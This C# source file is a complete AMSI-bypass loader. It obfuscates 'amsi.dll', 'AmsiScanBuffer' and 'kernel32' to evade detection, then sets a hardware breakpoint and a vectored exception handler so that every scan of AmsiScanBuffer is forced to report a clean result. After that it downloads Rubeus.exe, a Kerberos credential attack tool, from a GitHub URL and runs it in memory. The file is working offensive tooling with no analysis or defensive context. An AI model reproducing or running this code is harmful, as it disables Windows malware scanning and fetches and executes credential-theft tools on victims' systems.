using System;
using System.Net;
using System.Reflection;
using System.Text;
using System.Runtime.InteropServices;

namespace Test
{
    class Program
    {
        static IntPtr baser = WinAPI.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
        static IntPtr addr = WinAPI.GetProcAddress(baser, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
        // Allocate memory for the CONTEXT64 structure
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf<WinAPI.CONTEXT64>());

        static void Main()
        {
            SetupBypass();

            // Configure security protocol and load external assembly
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"));
            sb.EntryPoint.Invoke(null, new object[] { new string[] { "" } });
            Console.WriteLine("Assembly FullName: " + sb.FullName);
        }

        // Setup the Vectored Exception Handler for bypass
        static void SetupBypass()
        {
            // Create and initialize CONTEXT64 structure
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64 { ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL };

            // Get the method information for the Handler method
            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            Marshal.StructureToPtr(ctx, pCtx, true);
            WinAPI.GetThreadContext((IntPtr)(-2), pCtx);

            // Update the CONTEXT64 structure with the current values
            ctx = Marshal.PtrToStructure<WinAPI.CONTEXT64>(pCtx);

            // Enable the breakpoint for function
            EnableBreakpoint(ctx, addr, 0);

            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }

        // Custom exception handler for the Vectored Exception Handler
        public static long Handler(IntPtr exceptions)
        {
            // Marshal the EXCEPTION_POINTERS structure from the exception pointer
            WinAPI.EXCEPTION_POINTERS ep = Marshal.PtrToStructure<WinAPI.EXCEPTION_POINTERS>(exceptions);
            WinAPI.EXCEPTION_RECORD exceptionRecord = Marshal.PtrToStructure<WinAPI.EXCEPTION_RECORD>(ep.pExceptionRecord);
            WinAPI.CONTEXT64 contextRecord = Marshal.PtrToStructure<WinAPI.CONTEXT64>(ep.pContextRecord);

            // Check if the exception is a single step exception and the address is the correct function
            if (exceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && exceptionRecord.ExceptionAddress == addr)
            {
                // Capture the return address and scan result pointer
                ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)contextRecord.Rsp);
                IntPtr scanResult = Marshal.ReadIntPtr((IntPtr)(contextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Console.WriteLine("Buffer: 0x" + contextRecord.R8.ToString("X"));
                Console.WriteLine("Scan Result: 0x" + Marshal.ReadInt32(scanResult).ToString("X"));

                // Modify the scan result to AMSI_RESULT_CLEAN
                Marshal.WriteInt32(scanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                contextRecord.Rip = returnAddress;
                contextRecord.Rsp += 8;
                contextRecord.Rax = 0; // S_OK

                contextRecord.Dr0 = 0;
                contextRecord.Dr7 = SetBits(contextRecord.Dr7, 0, 1, 0);
                contextRecord.Dr6 = 0;
                contextRecord.EFlags = 0;

                contextRecord.R8 = 0; // XOR r8, r8; (Set r8 to zero)

                // Set the updated context record back to the exception pointers
                Marshal.StructureToPtr(contextRecord, ep.pContextRecord, true);

                // Continue execution after handling the exception
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                // Continue searching for other exception handlers
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }
        }

        // Enable the breakpoint at the specified address in the context structure
        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            //Clearing bits 16-31 in Dr7 to disable existing hardware breakpoints,
            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            //Setting the specific hardware breakpoint for the given index
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            //Clearing Dr6 to handle hardware breakpoint conditions
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        // Set specified bits in a ulong value
        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    // WinAPI class containing necessary structures and function signatures
    class WinAPI
    {
        public const Int32 AMSI_RESULT_CLEAN = 0;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;

        [DllImport("ke" +"rne" + "l32", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("ke" +"rne" + "l32", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("ke" +"rne" + "l32", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("ke" +"rne" + "l32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("ke" +"rne" + "l32")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            // Specifies that this context is for the AMD64 architecture
            CONTEXT64_AMD64 = 0x100000,

            // Control registers (cs, ss, ds, es, fs, gs, and eflags) are valid
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,

            // Integer registers (rax, rcx, rdx, rbx, rsp, rbp, rsi, rdi, r8-r15) are valid
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,

            // Segment registers (cs, ds, es, fs, gs, ss) are valid
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,

            // Floating-point state (XMM registers and MXCSR) is valid
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,

            // Debug registers (dr0-dr7) are valid
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,

            // Full context, including control, integer, floating-point, and debug registers, is valid
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,

            // All context, including control, integer, segment, floating-point, and debug registers, is valid
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            // High-order 64 bits of the 128-bit value
            public ulong High;

            // Low-order 64 bits of the 128-bit value
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            // Floating-point control word
            public ushort ControlWord;

            // Floating-point status word
            public ushort StatusWord;

            // Floating-point tag word
            public byte TagWord;

            // Reserved for future use
            public byte Reserved1;

            // Floating-point instruction error code
            public ushort ErrorOpcode;

            // Offset into Extended Registers area where the error occurred
            public uint ErrorOffset;

            // Selector of the segment containing the instruction that caused the error
            public ushort ErrorSelector;

            // Reserved for future use
            public ushort Reserved2;

            // Offset into the Extended Registers area for saving processor state
            public uint DataOffset;

            // Selector of the segment containing the data that caused the exception
            public ushort DataSelector;

            // Reserved for future use
            public ushort Reserved3;

            // Mask for the x87 FPU status word
            public uint MxCsr;

            // Mask for the valid bits in MxCsr
            public uint MxCsr_Mask;

            // Floating-point registers (xmm0-xmm7)
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            // XMM registers (xmm8-xmm15)
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            // Reserved for future use
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            // Home address for the 6 integer registers P1-P6
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            // Flags specifying the valid context
            public CONTEXT64_FLAGS ContextFlags;

            // Machine status register for floating-point state
            public uint MxCsr;

            // Segment selectors and flags
            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;

            // Processor flags
            public uint EFlags;

            // Debug registers
            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            // Integer registers
            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;
            
            // Union of XSAVE_FORMAT64 and legacy floating-point state
            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            // Vector registers (ymm0-ymm15)
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            
            // Vector control and status
            public ulong VectorControl;

            // Debug control values
            public ulong DebugControl;

            // Addresses for the last branch and exception events
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            // Exception code describing the exception that occurred
            public uint ExceptionCode;

            // Exception flags providing additional information
            public uint ExceptionFlags;

            // Pointer to an associated EXCEPTION_RECORD structure
            public IntPtr ExceptionRecord;

            // Address at which the exception occurred
            public IntPtr ExceptionAddress;

            // Number of parameters associated with the exception
            public uint NumberParameters;

            // Array of additional information about the exception
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            // Pointer to an EXCEPTION_RECORD structure
            public IntPtr pExceptionRecord;

            // Pointer to a CONTEXT64 structure
            public IntPtr pContextRecord;
        }

    }
}
